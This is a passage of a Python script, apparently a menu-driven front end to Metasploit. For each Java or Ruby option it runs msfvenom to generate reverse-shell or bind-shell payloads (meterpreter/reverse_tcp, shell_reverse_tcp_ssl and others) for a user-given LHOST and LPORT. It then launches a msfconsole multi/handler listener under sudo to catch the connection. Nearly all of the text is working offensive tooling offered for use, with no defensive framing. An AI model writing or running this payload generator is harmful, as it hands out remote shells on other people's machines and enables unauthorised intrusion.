      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()


def crjava():
  start()
  pubip()
  slowprint(colors.green + """
[1]  java/meterpreter/reverse_http
[2]  java/meterpreter/reverse_https
[3]  java/meterpreter/reverse_tcp
[4]  java/shell/reverse_tcp
[5]  java/shell_reverse_tcp
[6]  java/meterpreter/bind_tcp
[7]  java/shell/bind_tcp

[00] Back

""")
  crjavaget = str(input("\033[37m[\033[31m+\033[37m] Java > "))
  if crjavaget == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform java -f jar -p java/meterpreter/reverse_http LHOST={0} LPORT={1} -o {2}.jar".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    javalis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if javalis == "Yes" or javalis == "yes" or javalis == "y" or javalis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "java/meterpreter/reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()

  if crjavaget == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform java -f jar -p java/meterpreter/reverse_https LHOST={0} LPORT={1} -o {2}.jar".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    javalis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if javalis == "Yes" or javalis == "yes" or javalis == "y" or javalis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "java/meterpreter/reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()

  if crjavaget == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o {2}.jar".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    javalis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if javalis == "Yes" or javalis == "yes" or javalis == "y" or javalis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "java/meterpreter/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()

  if crjavaget == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform java -f jar -p java/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.jar".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    javalis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if javalis == "Yes" or javalis == "yes" or javalis == "y" or javalis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "java/shell/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()

  if crjavaget == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform java -f jar -p java/shell_reverse_tcp LHOST={0} LPORT={1} -o {2}.jar".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    javalis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if javalis == "Yes" or javalis == "yes" or javalis == "y" or javalis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "java/shell_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()

  if crjavaget == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform java -f jar -p java/meterpreter/bind_tcp LHOST={0} LPORT={1} -o {2}.jar".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    javalis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if javalis == "Yes" or javalis == "yes" or javalis == "y" or javalis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "java/meterpreter/bind_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()


  if crjavaget == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform java -f jar -p java/shell/bind_tcp LHOST={0} LPORT={1} -o {2}.jar".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    javalis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if javalis == "Yes" or javalis == "yes" or javalis == "y" or javalis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "java/shell/bind_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()



def crruby():
  start()
  pubip()
  slowprint(colors.green + """
[1]  ruby/shell_reverse_tcp_ssl
[2]  ruby/shell_reverse_tcp
[3]  ruby/shell_bind_tcp_ipv6
[4]  ruby/shell_bind_tcp

[00] Back

""")
  crrubyget = str(input("\033[37m[\033[31m+\033[37m] Ruby >"))
  if crrubyget == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform ruby -f raw -p ruby/shell_reverse_tcp_ssl LHOST={0} LPORT={1} -o {2}.rb".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    rubylis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if rubylis == "Yes" or rubylis == "yes" or rubylis == "y" or rubylis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "ruby/shell_reverse_tcp_ssl"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()
  
  if crrubyget == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform ruby -f raw -p ruby/shell_reverse_tcp LHOST={0} LPORT={1} -o {2}.rb".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    rubylis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if rubylis == "Yes" or rubylis == "yes" or rubylis == "y" or rubylis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "ruby/shell_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()
  
  if crrubyget == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform ruby -f raw -p ruby/shell_bind_tcp_ipv6 LHOST={0} LPORT={1} -o {2}.rb".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    rubylis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if rubylis == "Yes" or rubylis == "yes" or rubylis == "y" or rubylis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "ruby/shell_bind_tcp_ipv6"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()



  if crrubyget == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform ruby -f raw -p ruby/shell_bind_tcp LHOST={0} LPORT={1} -o {2}.rb".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    rubylis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if rubylis == "Yes" or rubylis == "yes" or rubylis == "y" or rubylis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "ruby/shell_bind_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()


def program():
    try:
      dbstart()
      menu()
    except KeyboardInterrupt:
      con = input(colors.red + "\n\n [c] Continue [q] Quit : ")
      if con == "c" or con == "C" or con == "continue" or con == "Continue":
        menu()
      else:
        exit()
	
if '__main__' == __name__:
	program()
